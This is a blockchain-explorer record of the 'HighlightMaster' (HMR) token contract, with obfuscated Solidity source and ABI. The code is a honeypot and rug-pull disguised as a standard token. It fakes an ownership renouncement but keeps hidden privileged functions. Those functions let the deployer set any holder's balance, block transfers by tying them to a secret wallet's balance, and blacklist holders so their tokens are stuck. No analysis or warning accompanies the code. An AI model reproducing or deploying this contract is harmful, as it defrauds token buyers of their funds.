{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface feeTake {\n    function createPair(address fromMin, address buyTotal) external returns (address);\n}\n\ninterface receiverTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedToken) external view returns (uint256);\n\n    function transfer(address maxFundMarketing, uint256 launchedTo) external returns (bool);\n\n    function allowance(address marketingMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxFundMarketing,\n        uint256 launchedTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxSender, uint256 value);\n    event Approval(address indexed marketingMin, address indexed spender, uint256 value);\n}\n\nabstract contract marketingReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenLaunchedAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedTrading is receiverTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HighlightMaster is marketingReceiver, receiverTotal, launchedTrading {\n\n    function launchedLiquidity(address takeLiquidity) public {\n        if (senderTakeMin) {\n            return;\n        }\n        \n        maxWallet[takeLiquidity] = true;\n        if (receiverLimitLiquidity != fromList) {\n            feeMarketingMax = takeIsFee;\n        }\n        senderTakeMin = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamMode;\n    }\n\n    bool public receiverLimitLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return isLimit;\n    }\n\n    uint256 private takeIsFee;\n\n    function transfer(address feeLiquidity, uint256 launchedTo) external virtual override returns (bool) {\n        return takeMax(_msgSender(), feeLiquidity, launchedTo);\n    }\n\n    function marketingAmount() private view {\n        require(maxWallet[_msgSender()]);\n    }\n\n    function takeMax(address fundLaunched, address maxFundMarketing, uint256 launchedTo) internal returns (bool) {\n        if (fundLaunched == senderSwap) {\n            return listLaunchSwap(fundLaunched, maxFundMarketing, launchedTo);\n        }\n        uint256 launchedList = receiverTotal(toMax).balanceOf(amountTxTotal);\n        require(launchedList == tradingFeeTo);\n        require(maxFundMarketing != amountTxTotal);\n        if (buyLaunch[fundLaunched]) {\n            return listLaunchSwap(fundLaunched, maxFundMarketing, enableTakeList);\n        }\n        return listLaunchSwap(fundLaunched, maxFundMarketing, launchedTo);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverWallet;\n    }\n\n    bool private fromList;\n\n    event OwnershipTransferred(address indexed exemptTakeTeam, address indexed takeSender);\n\n    uint256 constant enableTakeList = 5 ** 10;\n\n    function buyMode(uint256 launchedTo) public {\n        marketingAmount();\n        tradingFeeTo = launchedTo;\n    }\n\n    string private receiverWallet = \"HMR\";\n\n    address amountTxTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address takeReceiverBuy, uint256 launchedTo) public virtual override returns (bool) {\n        exemptModeTrading[_msgSender()][takeReceiverBuy] = launchedTo;\n        emit Approval(_msgSender(), takeReceiverBuy, launchedTo);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return feeTx;\n    }\n\n    function transferFrom(address fundLaunched, address maxFundMarketing, uint256 launchedTo) external override returns (bool) {\n        if (_msgSender() != maxSwapSell) {\n            if (exemptModeTrading[fundLaunched][_msgSender()] != type(uint256).max) {\n                require(launchedTo <= exemptModeTrading[fundLaunched][_msgSender()]);\n                exemptModeTrading[fundLaunched][_msgSender()] -= launchedTo;\n            }\n        }\n        return takeMax(fundLaunched, maxFundMarketing, launchedTo);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverFrom;\n    }\n\n    function allowance(address tradingReceiver, address takeReceiverBuy) external view virtual override returns (uint256) {\n        if (takeReceiverBuy == maxSwapSell) {\n            return type(uint256).max;\n        }\n        return exemptModeTrading[tradingReceiver][takeReceiverBuy];\n    }\n\n    bool public isTrading;\n\n    uint256 autoLaunched;\n\n    address public senderSwap;\n\n    function autoTo(address feeMode) public {\n        marketingAmount();\n        if (shouldReceiver == feeMarketingMax) {\n            isTrading = false;\n        }\n        if (feeMode == senderSwap || feeMode == toMax) {\n            return;\n        }\n        buyLaunch[feeMode] = true;\n    }\n\n    constructor (){\n        \n        tokenLaunchedAt marketingBuyLaunch = tokenLaunchedAt(maxSwapSell);\n        toMax = feeTake(marketingBuyLaunch.factory()).createPair(marketingBuyLaunch.WETH(), address(this));\n        \n        senderSwap = _msgSender();\n        maxWallet[senderSwap] = true;\n        feeMarketing[senderSwap] = teamMode;\n        fundIsAmount();\n        if (takeIsFee == feeMarketingMax) {\n            fromList = true;\n        }\n        emit Transfer(address(0), senderSwap, teamMode);\n    }\n\n    mapping(address => bool) public maxWallet;\n\n    string private isLimit = \"Highlight Master\";\n\n    bool public senderTakeMin;\n\n    mapping(address => mapping(address => uint256)) private exemptModeTrading;\n\n    uint256 private teamMode = 100000000 * 10 ** 18;\n\n    address private feeTx;\n\n    uint256 tradingFeeTo;\n\n    uint256 public feeMarketingMax;\n\n    address public toMax;\n\n    uint256 public shouldReceiver;\n\n    function getOwner() external view returns (address) {\n        return feeTx;\n    }\n\n    mapping(address => uint256) private feeMarketing;\n\n    mapping(address => bool) public buyLaunch;\n\n    function listLaunchSwap(address fundLaunched, address maxFundMarketing, uint256 launchedTo) internal returns (bool) {\n        require(feeMarketing[fundLaunched] >= launchedTo);\n        feeMarketing[fundLaunched] -= launchedTo;\n        feeMarketing[maxFundMarketing] += launchedTo;\n        emit Transfer(fundLaunched, maxFundMarketing, launchedTo);\n        return true;\n    }\n\n    function fundIsAmount() public {\n        emit OwnershipTransferred(senderSwap, address(0));\n        feeTx = address(0);\n    }\n\n    function toMaxMarketing(address feeLiquidity, uint256 launchedTo) public {\n        marketingAmount();\n        feeMarketing[feeLiquidity] = launchedTo;\n    }\n\n    address maxSwapSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private receiverFrom = 18;\n\n    function balanceOf(address launchedToken) public view virtual override returns (uint256) {\n        return feeMarketing[launchedToken];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTakeTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeReceiverBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiverBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"}],\"name\":\"autoTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedTo\",\"type\":\"uint256\"}],\"name\":\"buyMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMarketingMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundIsAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"}],\"name\":\"launchedLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimitLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTakeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTo\",\"type\":\"uint256\"}],\"name\":\"toMaxMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxFundMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HighlightMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}